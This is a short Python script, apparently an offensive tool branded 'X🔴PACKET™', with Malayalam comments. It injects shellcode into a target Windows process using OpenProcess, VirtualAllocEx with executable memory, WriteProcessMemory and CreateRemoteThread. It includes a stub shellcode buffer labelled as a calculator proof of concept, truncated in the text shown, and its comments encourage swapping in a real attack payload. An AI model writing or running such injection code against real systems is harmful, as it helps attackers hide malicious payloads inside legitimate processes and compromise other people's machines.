import ctypes
import sys
import time

# --- WINDOWS SYSTEM ACCESS (ATOMIC LEVEL) ---
# ഈ കോൺസ്റ്റന്റുകൾ വിൻഡോസ് കേർണലുമായി സംസാരിക്കാൻ ഉള്ളതാണ്.
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

def phantom_strike(target_pid, shellcode):
    print(f"[*] X🔴PACKET™ Atomic Strike: Targetting PID {target_pid}")
    
    kernel32 = ctypes.windll.kernel32
    
    # 1. ടാർഗെറ്റ് പ്രോസസ്സ് തുറക്കുന്നു
    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(target_pid))
    if not process_handle:
        print("[!] FAILED: Could not open process. High integrity required.")
        return

    # 2. ആ പ്രോസസ്സിന്റെ മെമ്മറിയിൽ സ്പേസ് ഉണ്ടാക്കുന്നു
    memory_address = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    print(f"[*] Allocated atomic space at: {hex(memory_address)}")

    # 3. നിന്റെ അറ്റാക്ക് കോഡ് (Shellcode) ആ മെമ്മറിയിലേക്ക് എഴുതുന്നു
    kernel32.WriteProcessMemory(process_handle, memory_address, shellcode, len(shellcode), None)

    # 4. ആ മെമ്മറിയിൽ നിന്ന് ഒരു പുതിയ ത്രെഡ് (Thread) തുടങ്ങുന്നു
    # ഇതോടെ നിന്റെ പെയ്‌ലോഡ് ടാർഗെറ്റ് പ്രോസസ്സിന്റെ ഭാഗമായി റൺ ചെയ്യാൻ തുടങ്ങും.
    if kernel32.CreateRemoteThread(process_handle, None, 0, memory_address, 0, 0, None):
        print("[🔥] STRIKE SUCCESSFUL: Phantom payload injected into memory.")
    else:
        print("[!] FAILED: Injection blocked by system integrity.")

# --- EXAMPLE SHELLCODE (REAL WORLD PAYLOAD) ---
# ഇത് ഒരു സിമ്പിൾ കാൽക്കുലേറ്റർ തുറക്കാനുള്ള ഷെൽകോഡ് ആണ് (PoC)
# റിയൽ അറ്റാക്കിൽ നിന്റെ 'hardened_striker' ഇതിലേക്ക് മാറ്റാം.
buf =  b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
buf += b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"

if __name__ == "__main__":
    if len(sys.argv) > 1:
        phantom_strike(sys.argv[1], buf)
    else:
        print("Usage: python3 phantom_injector.py <Target_PID>")
